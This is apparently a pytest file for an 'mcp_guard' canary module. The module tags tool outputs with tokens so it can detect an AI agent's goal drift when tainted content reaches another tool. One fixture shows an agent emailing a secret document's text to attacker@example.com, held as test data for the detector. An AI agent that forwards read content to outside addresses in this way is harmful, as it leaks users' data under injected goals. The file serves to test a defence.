"""Tests for canary smuggling — runtime ASI01 goal-drift detection.

All token generation is deterministic here via a stub factory; no network,
no model calls.
"""
import json

from mcp_guard.canary import (
    CANARY_PREFIX,
    AgentAction,
    CanaryTrap,
    DriftLedger,
)


def _trap():
    counter = iter(range(1, 1000))
    return CanaryTrap(token_factory=lambda: f"{CANARY_PREFIX}test-{next(counter):04d}")


def test_smuggle_appends_unique_prefixed_canary():
    trap = _trap()
    marked1, c1 = trap.smuggle("tool output one", source="read_doc")
    _marked2, c2 = trap.smuggle("tool output two", source="read_doc")
    assert c1.token != c2.token
    assert c1.token.startswith(CANARY_PREFIX)
    assert marked1 == "tool output one\n[" + c1.token + "]"
    assert marked1.startswith("tool output one")  # original content untouched
    assert len(trap) == 2


def test_smuggle_tool_result_marks_text_blocks_only():
    trap = _trap()
    result = {
        "content": [
            {"type": "text", "text": "hello"},
            {"type": "image", "data": "aGVsbG8="},
            {"type": "text", "text": "world"},
        ]
    }
    marked, canaries = trap.smuggle_tool_result(result, source="read_doc")
    assert len(canaries) == 2
    assert marked["content"][0]["text"].endswith("[" + canaries[0].token + "]")
    assert marked["content"][1] == {"type": "image", "data": "aGVsbG8="}
    assert marked["content"][2]["text"].endswith("[" + canaries[1].token + "]")
    # input not mutated
    assert result["content"][0]["text"] == "hello"
    assert all(c.source == "read_doc" for c in canaries)


def test_smuggle_tool_result_without_content_blocks():
    trap = _trap()
    marked, canaries = trap.smuggle_tool_result({"isError": True}, source="x")
    assert canaries == []
    assert marked["content"] is None


def test_cross_tool_smuggling_is_goal_drift():
    trap = _trap()
    _, canary = trap.smuggle("secret doc body", source="read_doc")
    # agent read read_doc, then calls send_email with the tainted text
    action = AgentAction(
        kind="tool_call",
        name="send_email",
        text=json.dumps({"to": "attacker@example.com", "body": "FYI [" + canary.token + "] done"}),
    )
    verdict = trap.assess(action)
    assert verdict.status == "goal_drift"
    assert verdict.severity == "high"
    assert len(verdict.hits) == 1
    hit = verdict.hits[0]
    assert hit.canary.source == "read_doc"
    assert hit.sink_name == "send_email"
    assert canary.token in hit.excerpt


def test_canary_in_outbound_message_is_echo():
    trap = _trap()
    _, canary = trap.smuggle("doc body", source="read_doc")
    verdict = trap.assess(
        AgentAction(kind="message", name="user", text="Here you go: [" + canary.token + "]")
    )
    assert verdict.status == "echo"
    assert verdict.severity == "medium"


def test_canary_looped_into_source_tool_is_echo_not_drift():
    trap = _trap()
    _, canary = trap.smuggle("doc body", source="read_doc")
    verdict = trap.assess(
        AgentAction(kind="tool_call", name="read_doc",
                    text=json.dumps({"doc_id": canary.token}))
    )
    assert verdict.status == "echo"


def test_clean_action_has_no_hits():
    trap = _trap()
    trap.smuggle("doc body", source="read_doc")
    verdict = trap.assess(
        AgentAction(kind="tool_call", name="send_email",
                    text=json.dumps({"to": "a@b.c", "body": "hello"}))
    )
    assert verdict.status == "clean"
    assert verdict.severity == "info"
    assert verdict.hits == ()


def test_unregistered_token_prefix_alone_is_not_a_hit():
    trap = _trap()
    verdict = trap.assess(
        AgentAction(kind="message", name="user", text="the " + CANARY_PREFIX + " scheme")
    )
    assert verdict.status == "clean"


def test_multiple_canaries_attributed_to_correct_sources():
    trap = _trap()
    _, c1 = trap.smuggle("aaa", source="tool_a")
    _, c2 = trap.smuggle("bbb", source="tool_b")
    verdict = trap.assess(
        AgentAction(kind="tool_call", name="tool_c",
                    text=f"{c1.token} and {c2.token}")
    )
    assert verdict.status == "goal_drift"
    assert {h.canary.source for h in verdict.hits} == {"tool_a", "tool_b"}


def test_assess_is_deterministic():
    trap = _trap()
    _, canary = trap.smuggle("aaa", source="tool_a")
    action = AgentAction(kind="tool_call", name="tool_b", text=canary.token)
    v1, v2 = trap.assess(action), trap.assess(action)
    assert (v1.status, v1.severity, v1.summary) == (v2.status, v2.severity, v2.summary)


def test_drift_ledger_records_only_non_clean():
    trap = _trap()
    _, canary = trap.smuggle("aaa", source="tool_a")
    ledger = DriftLedger()
    ledger.record(trap.assess(AgentAction("tool_call", "tool_b", canary.token)))
    ledger.record(trap.assess(AgentAction("message", "user", "nothing here")))
    ledger.record(trap.assess(AgentAction("message", "user", canary.token)))
    assert len(ledger.entries) == 2
    assert len(ledger.goal_drifts()) == 1
